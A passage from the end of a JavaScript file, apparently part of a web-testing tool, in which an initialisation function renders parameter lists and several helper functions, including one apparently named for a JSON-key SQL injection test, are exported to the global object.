    log(typeof t === "function" ? t("jsontest.aborting") : "JSON-Key-Test wird abgebrochen…");
});

    function initParams() {
        // Event listeners are already in the extracted bodies.
        // Ensure empty states rendered once.
        if (typeof renderPageParamList === "function") renderPageParamList();
        if (typeof renderNetParamList === "function") renderNetParamList();
    }

    global.initParams = initParams;
    global.appendParamToUrl = appendParamToUrl;
    global.appendParamToBody = appendParamToBody;
    global.collectParamsFromEntry = collectParamsFromEntry;
    global.renderNetParamList = renderNetParamList;
    global.renderPageParamList = renderPageParamList;
    global.netParamMap = netParamMap;
    global.showJsonExplorer = showJsonExplorer;
    global.runJsonKeysSqliTest = runJsonKeysSqliTest;

})(typeof window !== "undefined" ? window : this);
